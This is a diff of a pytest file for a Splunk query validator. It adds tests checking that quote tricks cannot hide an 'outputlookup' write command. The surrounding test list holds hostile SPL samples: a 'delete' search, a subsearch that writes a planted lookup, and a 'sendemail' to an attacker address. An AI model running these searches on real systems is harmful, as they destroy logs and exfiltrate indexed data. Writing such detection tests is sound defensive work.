@@ -176,6 +176,19 @@ def test_splunk_can_search_for_text_that_looks_like_a_command() -> None:
 @pytest.mark.parametrize(
     "search",
     [
+        # A double quote inside a single-quoted field name pairs with a later one.
+        """index=main | eval x='a"b' | outputlookup "p.csv\"""",
+        # An apostrophe that is plain text shifts every pairing after it.
+        """index=main it's fine | eval x='a"b' | outputlookup "p.csv\"""",
+    ],
+)
+def test_quotes_cannot_hide_a_splunk_command_that_writes(search: str) -> None:
+    assert writing_spl_command(search) == "outputlookup"
+
+
+@pytest.mark.parametrize(
+    "search",
+    [
         "index=main | delete",
         "index=main [ search x | outputlookup planted.csv ]",
         "index=main | sendemail to=attacker@example.com",
